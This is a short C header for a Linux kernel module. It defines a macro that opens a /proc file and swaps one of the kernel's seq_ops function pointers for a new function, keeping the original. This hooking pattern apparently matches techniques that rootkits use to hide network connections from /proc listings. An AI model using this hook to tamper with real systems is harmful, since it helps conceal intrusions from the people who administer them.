# ifndef CPP
# include <linux/module.h>
# include <linux/kernel.h>
# include <net/tcp.h> // struct tcp_seq_afinfo.
//PDE_DATA
# include <linux/proc_fs.h>
# endif // CPP


#define set_afinfo_seq_op(op, path, afinfo_struct, new, old)    \
    do{ \
        struct file *filp;  \
        afinfo_struct *afinfo;  \
        filp = filp_open(path, O_RDONLY, 0);    \
        if(IS_ERR(filp)){   \
            printk("Failed to open %s with error %ld.\n",   \
                    path, PTR_ERR(filp));   \
            old = NULL; \
        }   \
        else{   \
                afinfo = PDE_DATA(filp->f_path.dentry->d_inode);    \
                old = afinfo->seq_ops.op;   \
                printk("Setting seq_op->" #op " from %p to %p.",    \
                        old, new);  \
                afinfo->seq_ops.op = new;   \
                filp_close(filp, 0);    \
        }   \
    }while(0)
